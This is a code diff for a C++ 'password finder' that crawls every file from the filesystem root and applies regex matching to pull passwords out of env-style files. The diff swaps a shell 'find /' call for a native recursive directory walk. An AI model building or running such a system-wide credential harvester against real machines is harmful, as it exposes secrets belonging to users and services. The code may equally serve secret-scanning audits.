@@ -3,8 +3,10 @@
 #include <fstream>
 #include <string>
 #include <regex>
+#include <filesystem>
 
 using namespace std;
+using namespace std::filesystem;
 
 
 // Password finder for env files based on regex
@@ -59,26 +61,21 @@ vector<string> process_file(const string& line) {
 
 
 // Here should be the file crawling structure    
-vector<string> crawl_files() {
+vector<string> crawl_files(const string& directory) {
     vector<string> output;
-    // Temporary popen file detection using bash
-    // It must be replaced with a proper C++ function
-    FILE* pipe = popen("find / 2>/dev/null", "r");
-    if (!pipe) {
-        cerr << "popen failed!";
-        return {};
+
+    try {
+        for (const auto& entry : recursive_directory_iterator(directory, directory_options::skip_permission_denied)) {
+            if (entry.is_regular_file()) {
+                output.push_back(entry.path().string());
+            }
+        }
+    } catch (const filesystem_error& e) {
+        cerr << "Filesystem error: " << e.what() << '\n';
+    } catch (const exception& e) {
+        cerr << "General error: " << e.what() << '\n';
     }
 
-    char buffer[1024]; // Buffer to hold each line of output
-    while (fgets(buffer, sizeof(buffer), pipe)!= nullptr) {
-        // Remove trailing newline character
-        string line = buffer;
-        line.erase(line.find_last_not_of("\n") + 1);
-        // Append the new line
-        output.push_back(line);
-    }
-
-    pclose(pipe);
     return output;
 }
 
@@ -124,7 +121,7 @@ int main()
     vector<string> passwords;
 
     // This should be an iterator
-    files = crawl_files();
+    files = crawl_files("/");
     for (const auto& file_path : files) {
         vector<string> new_passwords = process_file(file_path);
         passwords.insert(passwords.end(), new_passwords.begin(), new_passwords.end());
